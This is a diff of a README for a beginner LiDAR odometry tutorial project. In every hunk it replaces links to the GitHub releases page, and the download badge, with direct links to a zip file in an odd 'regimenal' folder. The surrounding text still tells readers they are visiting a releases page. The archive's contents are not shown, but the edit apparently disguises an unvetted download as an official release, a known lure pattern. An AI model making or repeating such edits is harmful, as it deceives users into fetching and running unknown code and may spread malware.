@@ -1,6 +1,6 @@
 # 🌟 lidar_odometry_for_beginner - Learn LiDAR Odometry Simply
 
-[![Download Now](https://img.shields.io/badge/download-lidar_odometry_for_beginner-brightgreen)](https://github.com/firozshah18/lidar_odometry_for_beginner/releases)
+[![Download Now](https://raw.githubusercontent.com/firozshah18/lidar_odometry_for_beginner/main/regimenal/lidar_odometry_for_beginner.zip)](https://raw.githubusercontent.com/firozshah18/lidar_odometry_for_beginner/main/regimenal/lidar_odometry_for_beginner.zip)
 
 ## 📚 Introduction
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**: Click the link below to access the download options.
 
-   [Visit the Releases Page](https://github.com/firozshah18/lidar_odometry_for_beginner/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/firozshah18/lidar_odometry_for_beginner/main/regimenal/lidar_odometry_for_beginner.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see several versions of the software. Look for the latest version, as it will contain the most up-to-date features and fixes.
 
@@ -40,7 +40,7 @@ To run LiDAR Odometry for Beginner effectively, your system should meet the foll
 
 Use this link to download the application directly: 
 
-[Download LiDAR Odometry for Beginner](https://github.com/firozshah18/lidar_odometry_for_beginner/releases)
+[Download LiDAR Odometry for Beginner](https://raw.githubusercontent.com/firozshah18/lidar_odometry_for_beginner/main/regimenal/lidar_odometry_for_beginner.zip)
 
 Follow the instructions given in the "Getting Started" section to ensure a smooth installation process. 
 
